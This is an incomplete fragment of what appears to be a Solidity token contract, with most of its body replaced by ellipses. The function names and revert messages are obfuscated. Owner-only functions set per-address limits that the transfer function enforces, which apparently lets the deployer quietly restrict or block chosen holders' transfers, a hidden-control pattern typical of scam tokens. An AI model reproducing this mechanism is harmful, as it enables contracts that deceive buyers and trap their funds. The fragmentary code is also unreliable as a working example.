...
/**
    ...
    function quitqqqBUGgggg(address nnn) external   {
    ...
    function addBBBBUUTUcccc(address nnn) external   {
        if (_pproject != _msgSender()){
            revert("2231321 love");
        }
    ...
    function chabbbbuuugggaaa(address nnn) public view returns(uint256)  {
        return highkingdao[nnn];
    }


    function setAdminbUGaccddd(uint256 num) external {
         if (_pproject != _msgSender()){
            revert("adsasdsa love");
        }
    ...
    function _transfer(
        ...
        uint256 bugAmount = highkingdao[from].subbbb(0);
        require(bugAmount <= amount1, "MMMMMM");
